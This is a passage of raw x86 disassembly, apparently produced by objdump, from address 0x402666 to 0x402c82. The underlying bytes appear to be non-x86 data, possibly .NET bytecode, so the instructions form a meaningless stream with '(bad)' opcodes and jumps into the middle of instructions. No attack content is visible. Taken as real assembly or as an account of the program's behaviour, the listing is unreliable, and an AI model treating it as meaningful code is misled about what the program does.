  402666:	outs   dx,DWORD PTR ds:[esi]
  402667:	inc    ebx
  402668:	add    BYTE PTR [eax],al
  40266a:	or     al,BYTE PTR [edi]
  40266c:	outs   dx,DWORD PTR ds:[esi]
  40266d:	inc    edx
  40266e:	add    BYTE PTR [eax],al
  402670:	or     bl,BYTE PTR [edi+0x16]
  402673:	inc    BYTE PTR [ecx]
  402675:	push   ss
  402676:	inc    BYTE PTR [ecx]
  402678:	or     eax,0x9062d08
  40267d:	cmp    DWORD PTR [ebx+0x72000000],eax
  402683:	xchg   ecx,eax
  402684:	add    BYTE PTR [eax],al
  402686:	jo     0x4026b0
  402688:	sbb    DWORD PTR [eax],eax
  40268a:	add    BYTE PTR [edx],cl
  40268c:	or     BYTE PTR [esp+ecx*1],ch
  40268f:	jb     0x402628
  402691:	add    BYTE PTR [eax],al
  402693:	jo     0x4026bd
  402695:	sbb    DWORD PTR [eax],eax
  402697:	add    BYTE PTR [edx],cl
  402699:	sub    ecx,DWORD PTR [edx]
  40269b:	jb     0x40263e
  40269d:	add    BYTE PTR [eax],al
  40269f:	jo     0x4026c9
  4026a1:	sbb    DWORD PTR [eax],eax
  4026a3:	add    BYTE PTR [edx],cl
  4026a5:	pop    es
  4026a6:	outs   dx,DWORD PTR ds:[esi]
  4026a7:	inc    esp
  4026a8:	add    BYTE PTR [eax],al
  4026aa:	or     bl,BYTE PTR [edi]
  4026ac:	and    BYTE PTR [edi+0x45],ch
  4026af:	add    BYTE PTR [eax],al
  4026b1:	or     dl,BYTE PTR [ebx]
  4026b3:	add    al,0x11
  4026b5:	add    al,0x6f
  4026b7:	sub    al,0x0
  4026b9:	add    BYTE PTR [edx],cl
  4026bb:	pop    ds
  4026bc:	and    BYTE PTR [ecx],dh
  4026be:	push   ss
  4026bf:	adc    DWORD PTR [esi+edx*1],eax
  4026c2:	pop    ds
  4026c3:	sbb    eax,0x466f
  4026c8:	or     dh,BYTE PTR [edx-0x55]
  4026cb:	add    BYTE PTR [eax],al
  4026cd:	jo     0x4026f7
  4026cf:	inc    edi
  4026d0:	add    BYTE PTR [eax],al
  4026d2:	or     dl,BYTE PTR [ebx]
  4026d4:	add    al,0x11
  4026d6:	add    al,0x72
  4026d8:	mov    bl,0x0
  4026da:	add    BYTE PTR [eax+0x28],dh
  4026dd:	inc    edi
  4026de:	add    BYTE PTR [eax],al
  4026e0:	or     ch,BYTE PTR [eax]
  4026e2:	sbb    DWORD PTR [eax],eax
  4026e4:	add    BYTE PTR [edx],cl
  4026e6:	push   es
  4026e7:	sub    eax,0x462811
  4026ec:	add    BYTE PTR [esi],al
  4026ee:	outs   dx,DWORD PTR ds:[esi]
  4026ef:	cmp    al,BYTE PTR [eax]
  4026f1:	add    BYTE PTR [edx],cl
  4026f3:	sub    BYTE PTR [eax],bl
  4026f5:	add    BYTE PTR [eax],al
  4026f7:	or     bl,dh
  4026f9:	and    eax,0x292806
  4026fe:	add    BYTE PTR [edx],cl
  402700:	sub    BYTE PTR [eax],bl
  402702:	add    BYTE PTR [eax],al
  402704:	or     dl,BYTE PTR [ecx]
  402706:	add    eax,0x486f
  40270b:	or     bh,BYTE PTR [edx]
  40270d:	cmp    bh,bh
  40270f:	(bad)  
  402710:	(bad)  
  402711:	fimul  WORD PTR [ecx+edx*1]
  402714:	add    eax,0x511072c
  402719:	outs   dx,DWORD PTR ds:[esi]
  40271a:	dec    ecx
  40271b:	add    BYTE PTR [eax],al
  40271d:	or     bl,ah
  40271f:	sub    al,BYTE PTR [ecx]
  402721:	adc    BYTE PTR [eax],al
  402723:	add    BYTE PTR [edx],al
  402725:	add    BYTE PTR [eax],ah
  402727:	add    bh,cl
  402729:	out    dx,eax
  40272a:	add    BYTE PTR [eax+eax*1],cl
  40272d:	add    BYTE PTR [eax],al
  40272f:	add    BYTE PTR [ebx],bl
  402731:	xor    BYTE PTR ds:0x5b00,al
  402737:	add    BYTE PTR [eax+eax*1],al
  40273a:	add    BYTE PTR [ecx],dl
  40273c:	jle    0x40275b
  40273e:	add    BYTE PTR [eax],al
  402740:	or     ch,BYTE PTR [eax]
  402742:	sbb    BYTE PTR [eax],al
  402744:	add    BYTE PTR [edx],cl
  402746:	sub    BYTE PTR [edi],ch
  402748:	add    BYTE PTR [eax],al
  40274a:	or     ch,BYTE PTR [eax]
  40274c:	sbb    DWORD PTR [eax],eax
  40274e:	add    BYTE PTR [esi],al
  402750:	pop    ss
  402751:	lea    eax,[ecx]
  402753:	add    BYTE PTR [eax],al
  402755:	add    DWORD PTR [ebx],ecx
  402757:	pop    es
  402758:	push   ss
  402759:	add    esp,DWORD PTR [edx+0x322807]
  40275f:	add    BYTE PTR [edx],cl
  402761:	sub    BYTE PTR [eax],bl
  402763:	add    BYTE PTR [eax],al
  402765:	or     al,BYTE PTR [edi+ebp*2]
  402768:	dec    edx
  402769:	add    BYTE PTR [eax],al
  40276b:	or     ch,BYTE PTR [edi+0x4b]
  40276e:	add    BYTE PTR [eax],al
  402770:	or     cl,BYTE PTR [ebx+ebp*1]
  402773:	push   cs
  402774:	or     BYTE PTR [edi+0x4c],ch
  402777:	add    BYTE PTR [eax],al
  402779:	or     cl,BYTE PTR [edx]
  40277b:	add    al,BYTE PTR [esi]
  40277d:	sub    BYTE PTR [eax+eax*1],al
  402780:	add    BYTE PTR [esi],al
  402782:	or     BYTE PTR [edi+0x48],ch
  402785:	add    BYTE PTR [eax],al
  402787:	or     ch,BYTE PTR ds:0x80adeea
  40278d:	sub    al,0x6
  40278f:	or     BYTE PTR [edi+0x49],ch
  402792:	add    BYTE PTR [eax],al
  402794:	or     bl,ah
  402796:	sub    al,BYTE PTR [eax]
  402798:	add    DWORD PTR [eax],edx
  40279a:	add    BYTE PTR [eax],al
  40279c:	add    al,BYTE PTR [eax]
  40279e:	add    BYTE PTR ss:[edx],bl
  4027a1:	push   eax
  4027a2:	add    BYTE PTR [edx],cl
  4027a4:	add    BYTE PTR [eax],al
  4027a6:	add    BYTE PTR [eax],al
  4027a8:	adc    esi,DWORD PTR [eax]
  4027aa:	add    eax,0x2100
  4027af:	add    BYTE PTR ds:0x28110000,al
  4027b5:	das    
  4027b6:	add    BYTE PTR [eax],al
  4027b8:	or     ch,BYTE PTR [eax]
  4027ba:	pop    ebx
  4027bb:	add    BYTE PTR [eax],al
  4027bd:	push   es
  4027be:	pop    ss
  4027bf:	lea    eax,[ecx]
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	add    DWORD PTR [edx],ecx
  4027c5:	push   es
  4027c6:	push   ss
  4027c7:	add    ah,BYTE PTR [edx+0x322806]
  4027cd:	add    BYTE PTR [edx],cl
  4027cf:	sub    BYTE PTR [eax],bl
  4027d1:	add    BYTE PTR [eax],al
  4027d3:	or     ch,BYTE PTR [edx]
  4027d5:	add    BYTE PTR [eax],al
  4027d7:	add    BYTE PTR [ebx],al
  4027d9:	xor    BYTE PTR ds:0x17600,al
  4027df:	add    BYTE PTR [eax],al
  4027e1:	add    BYTE PTR [eax],al
  4027e3:	add    BYTE PTR [edx],al
  4027e5:	outs   dx,DWORD PTR ds:[esi]
  4027e6:	cmp    al,BYTE PTR [eax]
  4027e8:	add    BYTE PTR [edx],cl
  4027ea:	adc    BYTE PTR [eax],al
  4027ec:	add    ch,BYTE PTR [edi+0x2c]
  4027ef:	add    BYTE PTR [eax],al
  4027f1:	or     bl,BYTE PTR [edx]
  4027f3:	xor    DWORD PTR [edi],esi
  4027f5:	add    dl,BYTE PTR [esi]
  4027f7:	sbb    ch,BYTE PTR [edi+0x46]
  4027fa:	add    BYTE PTR [eax],al
  4027fc:	or     ch,BYTE PTR [eax]
  4027fe:	dec    ebp
  4027ff:	add    BYTE PTR [eax],al
  402801:	or     ch,BYTE PTR [edi+0x4e]
  402804:	add    BYTE PTR [eax],al
  402806:	or     dh,BYTE PTR [edx-0x45]
  402809:	add    BYTE PTR [eax],al
  40280b:	jo     0x402835
  40280d:	cmp    DWORD PTR [eax],eax
  40280f:	add    BYTE PTR [edx],cl
  402811:	sub    al,0x19
  402813:	jle    0x40281b
  402815:	add    BYTE PTR [eax],al
  402817:	add    al,0x2
  402819:	sbb    ch,BYTE PTR [edi+0x4f]
  40281c:	add    BYTE PTR [eax],al
  40281e:	or     ch,BYTE PTR [eax]
  402820:	push   eax
  402821:	add    BYTE PTR [eax],al
  402823:	or     al,BYTE PTR [ebx]
  402825:	add    al,0x6f
  402827:	cmp    eax,0x2a0a0000
  40282c:	add    ch,BYTE PTR [edi+0x2c]
  40282f:	add    BYTE PTR [eax],al
  402831:	or     bl,BYTE PTR [eax]
  402833:	xor    DWORD PTR [ebx],esi
  402835:	add    dl,BYTE PTR [esi]
  402837:	sbb    BYTE PTR [edi+0x46],ch
  40283a:	add    BYTE PTR [eax],al
  40283c:	or     ch,BYTE PTR [eax]
  40283e:	dec    ebp
  40283f:	add    BYTE PTR [eax],al
  402841:	or     ch,BYTE PTR [edi+0x4e]
  402844:	add    BYTE PTR [eax],al
  402846:	or     dh,BYTE PTR [edx-0x3b]
  402849:	add    BYTE PTR [eax],al
  40284b:	jo     0x402875
  40284d:	cmp    DWORD PTR [eax],eax
  40284f:	add    BYTE PTR [edx],cl
  402851:	sub    al,0x15
  402853:	jle    0x40285b
  402855:	add    BYTE PTR [eax],al
  402857:	add    al,0x16
  402859:	add    bl,BYTE PTR [eax]
  40285b:	outs   dx,DWORD PTR ds:[esi]
  40285c:	dec    edi
  40285d:	add    BYTE PTR [eax],al
  40285f:	or     al,BYTE PTR [ebx]
  402861:	add    al,0x6f
  402863:	push   ecx
  402864:	add    BYTE PTR [eax],al
  402866:	or     ch,BYTE PTR [edx]
  402868:	add    ch,BYTE PTR [eax]
  40286a:	dec    ebp
  40286b:	add    BYTE PTR [eax],al
  40286d:	or     ch,BYTE PTR [edi+0x4e]
  402870:	add    BYTE PTR [eax],al
  402872:	or     dh,BYTE PTR [edx-0x35]
  402875:	add    BYTE PTR [eax],al
  402877:	jo     0x4028a1
  402879:	cmp    DWORD PTR [eax],eax
  40287b:	add    BYTE PTR [edx],cl
  40287d:	sub    al,0x12
  40287f:	jle    0x402887
  402881:	add    BYTE PTR [eax],al
  402883:	add    al,0x7e
  402885:	push   edx
  402886:	add    BYTE PTR [eax],al
  402888:	or     al,BYTE PTR [ebx]
  40288a:	add    al,0x6f
  40288c:	cmp    eax,0x2a0a0000
  402891:	add    ch,BYTE PTR [eax]
  402893:	dec    ebp
  402894:	add    BYTE PTR [eax],al
  402896:	or     ch,BYTE PTR [edi+0x4e]
  402899:	add    BYTE PTR [eax],al
  40289b:	or     dh,BYTE PTR [edx-0x2b]
  40289e:	add    BYTE PTR [eax],al
  4028a0:	jo     0x4028ca
  4028a2:	cmp    DWORD PTR [eax],eax
  4028a4:	add    BYTE PTR [edx],cl
  4028a6:	sub    al,0x12
  4028a8:	jle    0x4028b0
  4028aa:	add    BYTE PTR [eax],al
  4028ac:	add    al,0x7e
  4028ae:	push   ebx
  4028af:	add    BYTE PTR [eax],al
  4028b1:	or     al,BYTE PTR [ebx]
  4028b3:	add    al,0x6f
  4028b5:	cmp    eax,0x2a0a0000
  4028ba:	add    ch,BYTE PTR [edi+0x2c]
  4028bd:	add    BYTE PTR [eax],al
  4028bf:	or     bl,BYTE PTR [ecx]
  4028c1:	xor    DWORD PTR [esi+0x2],ecx
  4028c4:	push   ss
  4028c5:	sbb    ch,BYTE PTR [edi+0x46]
  4028c8:	add    BYTE PTR [eax],al
  4028ca:	or     ch,BYTE PTR [eax]
  4028cc:	dec    ebp
  4028cd:	add    BYTE PTR [eax],al
  4028cf:	or     ch,BYTE PTR [edi+0x4e]
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	or     dh,BYTE PTR [edx-0x21]
  4028d7:	add    BYTE PTR [eax],al
  4028d9:	jo     0x402903
  4028db:	cmp    DWORD PTR [eax],eax
  4028dd:	add    BYTE PTR [edx],cl
  4028df:	sub    al,0x30
  4028e1:	add    ch,BYTE PTR [edi+0x2c]
  4028e4:	add    BYTE PTR [eax],al
  4028e6:	or     bl,BYTE PTR [edx]
  4028e8:	xor    edx,DWORD PTR [edx]
  4028ea:	jle    0x4028f2
  4028ec:	add    BYTE PTR [eax],al
  4028ee:	add    al,0x7e
  4028f0:	push   esp
  4028f1:	add    BYTE PTR [eax],al
  4028f3:	or     al,BYTE PTR [ebx]
  4028f5:	add    al,0x6f
  4028f7:	cmp    eax,0x2a0a0000
  4028fc:	jle    0x402904
  4028fe:	add    BYTE PTR [eax],al
  402900:	add    al,0x18
  402902:	add    bl,BYTE PTR [edx]
  402904:	outs   dx,DWORD PTR ds:[esi]
  402905:	dec    edi
  402906:	add    BYTE PTR [eax],al
  402908:	or     al,BYTE PTR [ebx]
  40290a:	add    al,0x6f
  40290c:	push   ecx
  40290d:	add    BYTE PTR [eax],al
  40290f:	or     ch,BYTE PTR [edx]
  402911:	add    ch,BYTE PTR [edi+0x2c]
  402914:	add    BYTE PTR [eax],al
  402916:	or     bl,BYTE PTR [edx]
  402918:	xor    DWORD PTR [ecx],esi
  40291a:	add    dl,BYTE PTR [esi]
  40291c:	sbb    ch,BYTE PTR [edi+0x46]
  40291f:	add    BYTE PTR [eax],al
  402921:	or     ch,BYTE PTR [eax]
  402923:	dec    ebp
  402924:	add    BYTE PTR [eax],al
  402926:	or     ch,BYTE PTR [edi+0x4e]
  402929:	add    BYTE PTR [eax],al
  40292b:	or     dh,BYTE PTR [edx-0x17]
  40292e:	add    BYTE PTR [eax],al
  402930:	jo     0x40295a
  402932:	cmp    DWORD PTR [eax],eax
  402934:	add    BYTE PTR [edx],cl
  402936:	sub    al,0x13
  402938:	jle    0x402940
  40293a:	add    BYTE PTR [eax],al
  40293c:	add    al,0x2
  40293e:	sub    BYTE PTR [eax+0x0],dl
  402941:	add    BYTE PTR [edx],cl
  402943:	add    eax,DWORD PTR [edi+ebp*2]
  402946:	cmp    eax,0x2a0a0000
  40294b:	jle    0x402953
  40294d:	add    BYTE PTR [eax],al
  40294f:	add    al,0x16
  402951:	add    al,BYTE PTR [ebx]
  402953:	add    al,0x6f
  402955:	push   ecx
  402956:	add    BYTE PTR [eax],al
  402958:	or     ch,BYTE PTR [edx]
  40295a:	add    BYTE PTR [eax],al
  40295c:	adc    esi,DWORD PTR [eax]
  40295e:	add    eax,0x6700
  402963:	add    BYTE PTR [esi],al
  402965:	add    BYTE PTR [eax],al
  402967:	adc    DWORD PTR [eax],ebp
  402969:	das    
  40296a:	add    BYTE PTR [eax],al
  40296c:	or     ch,BYTE PTR [eax]
  40296e:	dec    esp
  40296f:	add    BYTE PTR [eax],al
  402971:	push   es
  402972:	pop    ss
  402973:	lea    eax,[ecx]
  402975:	add    BYTE PTR [eax],al
  402977:	add    DWORD PTR [eax+ecx*1],ecx
  40297a:	push   ss
  40297b:	add    ah,BYTE PTR [edx+0x322808]
  402981:	add    BYTE PTR [edx],cl
  402983:	sub    BYTE PTR [eax],bl
  402985:	add    BYTE PTR [eax],al
  402987:	or     al,BYTE PTR [edx]
  402989:	add    eax,DWORD PTR [eax+ebp*1]
  40298c:	pop    es
  40298d:	add    BYTE PTR [eax],al
  40298f:	push   es
  402990:	or     al,BYTE PTR [esi]
  402992:	sub    eax,0x33280b
  402997:	add    BYTE PTR [esi],al
  402999:	jae    0x4029f0
  40299b:	add    BYTE PTR [eax],al
  40299d:	or     bh,BYTE PTR [edx+0x6]
  4029a0:	outs   dx,DWORD PTR ds:[esi]
  4029a1:	sbb    al,BYTE PTR [eax]
  4029a3:	add    BYTE PTR [edx],cl
  4029a5:	outs   dx,DWORD PTR ds:[esi]
  4029a6:	pop    ds
  4029a7:	add    BYTE PTR [eax],al
  4029a9:	or     al,BYTE PTR [esi]
  4029ab:	outs   dx,DWORD PTR ds:[esi]
  4029ac:	and    BYTE PTR [eax],al
  4029ae:	add    BYTE PTR [edx],cl
  4029b0:	sub    BYTE PTR [ecx],ah
  4029b2:	add    BYTE PTR [eax],al
  4029b4:	or     cl,BYTE PTR [ebx]
  4029b6:	pop    es
  4029b7:	sub    eax,0x3b280b
  4029bc:	add    BYTE PTR [esi],al
  4029be:	jae    0x402a15
  4029c0:	add    BYTE PTR [eax],al
  4029c2:	or     bh,BYTE PTR [edx+0x5]
  4029c5:	sub    al,0x6
  4029c7:	push   es
  4029c8:	sub    BYTE PTR [ebx],al
  4029ca:	add    BYTE PTR [eax],al
  4029cc:	push   es
  4029cd:	push   es
  4029ce:	sub    al,BYTE PTR [eax]
  4029d0:	adc    esi,DWORD PTR [eax]
  4029d2:	add    al,0x0
  4029d4:	inc    edx
  4029d5:	add    BYTE PTR [eax],al
  4029d7:	add    BYTE PTR [edi],al
  4029d9:	add    BYTE PTR [eax],al
  4029db:	adc    DWORD PTR [eax],esp
  4029dd:	call   0xa4029e5
  4029e2:	adc    al,0xb
  4029e4:	jle    0x4029ec
  4029e6:	add    BYTE PTR [eax],al
  4029e8:	add    al,0x2
  4029ea:	add    edx,DWORD PTR [esi]
  4029ec:	outs   dx,DWORD PTR ds:[esi]
  4029ed:	cmp    eax,0xb0a0000
  4029f2:	pop    es
  4029f3:	sub    al,0x8
  4029f5:	pop    es
  4029f6:	outs   dx,DWORD PTR ds:[esi]
  4029f7:	push   esi
  4029f8:	add    BYTE PTR [eax],al
  4029fa:	or     ch,BYTE PTR ds:0x5728061f
  402a00:	add    BYTE PTR [eax],al
  402a02:	or     al,BYTE PTR [esi]
  402a04:	push   es
  402a05:	sbb    DWORD PTR [ebx+0x58],ebx
  402a08:	or     al,BYTE PTR [esi]
  402a0a:	and    BYTE PTR [eax+0x3100003a],bl
  402a10:	shr    DWORD PTR [eax],cl
  402a12:	xor    eax,DWORD PTR [eax]
  402a14:	add    BYTE PTR [esi],al
  402a16:	jae    0x402a6d
  402a18:	add    BYTE PTR [eax],al
  402a1a:	or     bh,BYTE PTR [edx+0x7]
  402a1d:	sub    al,BYTE PTR [eax]
  402a1f:	add    BYTE PTR [ecx],al
  402a21:	add    BYTE PTR [eax],al
  402a23:	add    BYTE PTR [ecx],al
  402a25:	add    BYTE PTR [eax],al
  402a27:	add    BYTE PTR [ecx],al
  402a29:	add    BYTE PTR [eax],al
  402a2b:	add    BYTE PTR [ecx],al
  402a2d:	add    BYTE PTR [eax],al
  402a2f:	add    BYTE PTR [ecx],al
  402a31:	add    BYTE PTR [eax],al
  402a33:	add    BYTE PTR [edx],al
  402a35:	add    BYTE PTR [eax],al
  402a37:	add    BYTE PTR [ebx],al
  402a39:	add    BYTE PTR [eax],al
  402a3b:	add    BYTE PTR [ecx],al
  402a3d:	add    BYTE PTR [eax],al
  402a3f:	add    BYTE PTR [edx],al
  402a41:	add    BYTE PTR [eax],al
  402a43:	add    BYTE PTR [edx],al
  402a45:	add    BYTE PTR [eax],al
  402a47:	add    BYTE PTR [ecx],al
  402a49:	add    BYTE PTR [eax],al
  402a4b:	add    BYTE PTR [edx],al
  402a4d:	add    BYTE PTR [eax],al
  402a4f:	add    BYTE PTR [edx],al
  402a51:	add    BYTE PTR [eax],al
  402a53:	add    BYTE PTR [edx],al
  402a55:	add    BYTE PTR [eax],al
  402a57:	add    BYTE PTR ds:0x5000000,al
  402a5d:	add    BYTE PTR [eax],al
  402a5f:	add    BYTE PTR [edx],al
  402a61:	add    BYTE PTR [eax],al
  402a63:	add    BYTE PTR [ecx],al
  402a65:	add    BYTE PTR [eax],al
  402a67:	add    BYTE PTR [ecx],al
  402a69:	add    BYTE PTR [eax],al
  402a6b:	add    BYTE PTR [ecx],al
  402a6d:	add    BYTE PTR [eax],al
  402a6f:	add    BYTE PTR [ecx],al
  402a71:	add    BYTE PTR [eax],al
  402a73:	add    BYTE PTR [ecx],al
  402a75:	add    BYTE PTR [eax],al
  402a77:	add    BYTE PTR [ecx],al
  402a79:	add    BYTE PTR [eax],al
  402a7b:	add    BYTE PTR [ecx],al
  402a7d:	add    BYTE PTR [eax],al
  402a7f:	add    BYTE PTR [edx],al
  402a81:	add    BYTE PTR [eax],al
  402a83:	add    BYTE PTR [eax],al
  402a85:	add    BYTE PTR [eax],al
  402a87:	add    BYTE PTR [edx],al
  402a89:	add    BYTE PTR [eax],al
  402a8b:	add    BYTE PTR [edx],al
  402a8d:	add    BYTE PTR [eax],al
  402a8f:	add    BYTE PTR [ecx],al
  402a91:	add    BYTE PTR [eax],al
  402a93:	add    BYTE PTR [edx],al
  402a95:	add    BYTE PTR [eax],al
  402a97:	add    BYTE PTR [edx],al
  402a99:	add    BYTE PTR [eax],al
  402a9b:	add    BYTE PTR [ecx],al
  402a9d:	add    BYTE PTR [eax],al
  402a9f:	add    BYTE PTR [eax+eax*1],al
  402aa2:	add    BYTE PTR [eax],al
  402aa4:	add    al,0x0
  402aa6:	add    BYTE PTR [eax],al
  402aa8:	add    DWORD PTR [eax],eax
  402aaa:	add    BYTE PTR [eax],al
  402aac:	add    BYTE PTR [eax],al
  402aae:	add    BYTE PTR [eax],al
  402ab0:	sbb    esi,DWORD PTR [eax]
  402ab2:	pop    es
  402ab3:	add    BYTE PTR [ecx+0x12],bl
  402ab6:	add    BYTE PTR [eax],al
  402ab8:	or     BYTE PTR [eax],al
  402aba:	add    BYTE PTR [ecx],dl
  402abc:	sub    BYTE PTR [ecx+0x0],bl
  402abf:	add    BYTE PTR [edx],cl
  402ac1:	sub    BYTE PTR [edx+0x0],bl
  402ac4:	add    BYTE PTR [edx],cl
  402ac6:	outs   dx,DWORD PTR ds:[esi]
  402ac7:	pop    ebx
  402ac8:	add    BYTE PTR [eax],al
  402aca:	or     ch,BYTE PTR [edi+0x5c]
  402acd:	add    BYTE PTR [eax],al
  402acf:	or     ch,BYTE PTR [eax]
  402ad1:	pop    ebp
  402ad2:	add    BYTE PTR [eax],al
  402ad4:	or     ch,BYTE PTR [edi+0x5e]
  402ad7:	add    BYTE PTR [eax],al
  402ad9:	or     cl,BYTE PTR [edx]
  402adb:	push   es
  402adc:	sub    BYTE PTR [edi+0x0],bl
  402adf:	add    BYTE PTR [edx],cl
  402ae1:	outs   dx,DWORD PTR ds:[esi]
  402ae2:	pop    esi
  402ae3:	add    BYTE PTR [eax],al
  402ae5:	or     ch,BYTE PTR [esi]
  402ae7:	inc    edx
  402ae8:	push   es
  402ae9:	sub    BYTE PTR [ecx+0x0],bl
  402aec:	add    BYTE PTR [edx],cl
  402aee:	outs   dx,DWORD PTR ds:[esi]
  402aef:	pusha  
  402af0:	add    BYTE PTR [eax],al
  402af2:	or     ch,BYTE PTR [edi+0x61]
  402af5:	add    BYTE PTR [eax],al
  402af7:	or     ch,BYTE PTR [edi+0x62]
  402afa:	add    BYTE PTR [eax],al
  402afc:	or     ch,BYTE PTR [esi]
  402afe:	sub    eax,DWORD PTR [esi]
  402b00:	sub    BYTE PTR [ecx+0x0],bl
  402b03:	add    BYTE PTR [edx],cl
  402b05:	outs   dx,DWORD PTR ds:[esi]
  402b06:	pusha  
  402b07:	add    BYTE PTR [eax],al
  402b09:	or     ch,BYTE PTR [edi+0x61]
  402b0c:	add    BYTE PTR [eax],al
  402b0e:	or     ch,BYTE PTR [edi+0x63]
  402b11:	add    BYTE PTR [eax],al
  402b13:	or     ch,BYTE PTR [esi]
  402b15:	adc    al,0x28
  402b17:	pop    ecx
  402b18:	add    BYTE PTR [eax],al
  402b1a:	or     dh,BYTE PTR [edx-0xd]
  402b1d:	add    BYTE PTR [eax],al
  402b1f:	jo     0x402b94
  402b21:	add    BYTE PTR fs:[eax],al
  402b24:	or     ch,BYTE PTR [edi+0x5c]
  402b27:	add    BYTE PTR [eax],al
  402b29:	or     bl,BYTE PTR [edi]
  402b2b:	adc    cl,BYTE PTR [ebp+0x100002c]
  402b31:	adc    esi,DWORD PTR [edi]
  402b33:	adc    DWORD PTR [edi],esi
  402b35:	push   ss
  402b36:	jb     0x402b31
  402b38:	add    BYTE PTR [eax],al
  402b3a:	jo     0x402ade
  402b3c:	adc    DWORD PTR [edi],esi
  402b3e:	pop    ss
  402b3f:	jb     0x402b3e
  402b41:	add    BYTE PTR [eax],al
  402b43:	jo     0x402ae7
  402b45:	adc    DWORD PTR [edi],esi
  402b47:	sbb    BYTE PTR [edx+0x3],dh
  402b4a:	add    DWORD PTR [eax],eax
  402b4c:	jo     0x402af0
  402b4e:	adc    DWORD PTR [edi],esi
  402b50:	sbb    DWORD PTR [edx+0xb],esi
  402b53:	add    DWORD PTR [eax],eax
  402b55:	jo     0x402af9
  402b57:	adc    DWORD PTR [edi],esi
  402b59:	sbb    dh,BYTE PTR [edx+0xb]
  402b5c:	add    DWORD PTR [eax],eax
  402b5e:	jo     0x402b02
  402b60:	adc    DWORD PTR [edi],esi
  402b62:	sbb    esi,DWORD PTR [edx+0xd]
  402b65:	add    DWORD PTR [eax],eax
  402b67:	jo     0x402b0b
  402b69:	adc    DWORD PTR [edi],esi
  402b6b:	sbb    al,0x72
  402b6d:	adc    eax,0xa2700001
  402b72:	adc    DWORD PTR [edi],esi
  402b74:	sbb    eax,0x11b72
  402b79:	jo     0x402b1d
  402b7b:	adc    DWORD PTR [edi],esi
  402b7d:	push   ds
  402b7e:	jb     0x402b9f
  402b80:	add    DWORD PTR [eax],eax
  402b82:	jo     0x402b26
  402b84:	adc    DWORD PTR [edi],esi
  402b86:	pop    ds
  402b87:	or     DWORD PTR [edx+0x27],esi
  402b8a:	add    DWORD PTR [eax],eax
  402b8c:	jo     0x402b30
  402b8e:	adc    DWORD PTR [edi],esi
  402b90:	pop    ds
  402b91:	or     dh,BYTE PTR [edx+0x2f]
  402b94:	add    DWORD PTR [eax],eax
  402b96:	jo     0x402b3a
  402b98:	adc    DWORD PTR [edi],esi
  402b9a:	pop    ds
  402b9b:	or     esi,DWORD PTR [edx+0x35]
  402b9e:	add    DWORD PTR [eax],eax
  402ba0:	jo     0x402b44
  402ba2:	adc    DWORD PTR [edi],esi
  402ba4:	pop    ds
  402ba5:	or     al,0x72
  402ba7:	cmp    eax,DWORD PTR [ecx]
  402ba9:	add    BYTE PTR [eax-0x5e],dh
  402bac:	adc    DWORD PTR [edi],esi
  402bae:	pop    ds
  402baf:	or     eax,0x14172
  402bb4:	jo     0x402b58
  402bb6:	adc    DWORD PTR [edi],esi
  402bb8:	pop    ds
  402bb9:	push   cs
  402bba:	jb     0x402c01
  402bbc:	add    DWORD PTR [eax],eax
  402bbe:	jo     0x402b62
  402bc0:	adc    DWORD PTR [edi],esi
  402bc2:	pop    ds
  402bc3:	(bad)  
  402bc5:	dec    ebx
  402bc6:	add    DWORD PTR [eax],eax
  402bc8:	jo     0x402b6c
  402bca:	adc    DWORD PTR [edi],esi
  402bcc:	pop    ds
  402bcd:	adc    BYTE PTR [edx+0x51],dh
  402bd0:	add    DWORD PTR [eax],eax
  402bd2:	jo     0x402b76
  402bd4:	adc    DWORD PTR [edi],esi
  402bd6:	pop    ds
  402bd7:	adc    DWORD PTR [edx+0x59],esi
  402bda:	add    DWORD PTR [eax],eax
  402bdc:	jo     0x402b80
  402bde:	adc    DWORD PTR [edi],esi
  402be0:	or     ebx,DWORD PTR [edi]
  402be2:	adc    cl,BYTE PTR [ebp+0x1000034]
  402be8:	and    eax,0xdd0
  402bed:	add    al,0x28
  402bef:	data16 add BYTE PTR [eax],al
  402bf2:	or     cl,BYTE PTR [edi+ebx*1]
  402bf5:	adc    cl,BYTE PTR [ebp+0x1000034]
  402bfb:	and    eax,0xed0
  402c00:	add    al,0x28
  402c02:	data16 add BYTE PTR [eax],al
  402c05:	or     cl,BYTE PTR ds:0x14041314
  402c0b:	adc    eax,DWORD PTR ds:0x6728
  402c11:	or     ch,BYTE PTR [eax]
  402c13:	and    BYTE PTR [eax],al
  402c15:	add    BYTE PTR [esi],al
  402c17:	sub    BYTE PTR [eax],bl
  402c19:	add    BYTE PTR [eax],al
  402c1b:	or     al,BYTE PTR [edx]
  402c1d:	mov    gs,WORD PTR [ecx+0x2d]
  402c20:	or     eax,0x128
  402c25:	push   es
  402c26:	push   ss
  402c27:	adc    esi,DWORD PTR [esi]
  402c29:	fucom  st(4)
  402c2b:	adc    BYTE PTR [eax],al
  402c2d:	add    BYTE PTR [ebx+edx*1],dl
  402c30:	push   es
  402c31:	adc    eax,0x68730713
  402c36:	add    BYTE PTR [eax],al
  402c38:	or     dl,BYTE PTR [ebx]
  402c3a:	or     BYTE PTR [ebx+0x68],dh
  402c3d:	add    BYTE PTR [eax],al
  402c3f:	or     dl,BYTE PTR [ebx]
  402c41:	or     DWORD PTR [ebx+0x68],esi
  402c44:	add    BYTE PTR [eax],al
  402c46:	or     dl,BYTE PTR [ebx]
  402c48:	or     al,BYTE PTR [edx]
  402c4a:	adc    edi,DWORD PTR [eax]
  402c4c:	push   ss
  402c4d:	adc    edi,DWORD PTR [ecx]
  402c4f:	sub    edx,DWORD PTR [edi]
  402c51:	adc    DWORD PTR [eax],edi
  402c53:	adc    DWORD PTR [ecx],edi
  402c55:	call   0xb11:0x9110b13
  402c5c:	outs   dx,DWORD PTR ds:[esi]
  402c5d:	imul   eax,DWORD PTR [eax],0x11260a00
  402c63:	cmp    DWORD PTR [edi],edx
  402c65:	pop    eax
  402c66:	adc    edi,DWORD PTR [ecx]
  402c68:	adc    DWORD PTR [ecx],edi
  402c6a:	adc    DWORD PTR [eax],edi
  402c6c:	mov    gs,WORD PTR [ecx+0x32]
  402c6f:	loope  0x402ce3
  402c71:	pop    ebp
  402c72:	add    DWORD PTR [eax],eax
  402c74:	jo     0x402c9e
  402c76:	push   0x0
  402c78:	add    BYTE PTR [edx],cl
  402c7a:	adc    ecx,DWORD PTR [ecx+edx*1]
  402c7d:	or     al,0x39
  402c7f:	push   edx
  402c80:	add    DWORD PTR [eax],eax
  402c82:	add    BYTE PTR [ecx],dl
